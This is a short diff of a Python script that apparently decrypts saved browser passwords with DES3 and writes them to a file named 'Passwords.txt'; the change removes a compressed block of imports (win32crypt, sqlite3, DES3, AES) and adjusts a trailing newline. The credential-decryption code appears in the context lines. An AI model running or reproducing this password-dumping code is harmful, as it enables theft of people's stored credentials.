@@ -14,12 +14,6 @@ from Crypto.Util.Padding import unpad
 from optparse import OptionParser
 import json
 from pathlib import Path
-import os,json,base64,sqlite3,win32crypt,shutil,click,re,random,hmac
-from pyasn1.codec.der import decoder;from hashlib import sha1,pbkdf2_hmac
-from struct import unpack;from binascii import hexlify,unhexlify
-from rich.console import Console;from rich.table import Table;from rich.theme import Theme
-from Crypto.Cipher import DES3,AES;from Crypto.Util.number import long_to_bytes;from Crypto.Util.Padding import unpad 
-from time import sleep,localtime
 
 if os.name=='nt':pass
 
@@ -320,4 +314,4 @@ with open('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt', 'w', encoding="utf-8") as 
         iv = i[1][1]
         ciphertext = i[1][2]
         f.write('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: %s\n' % unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8).decode())
-        f.write('\n')
+        f.write('\n') 
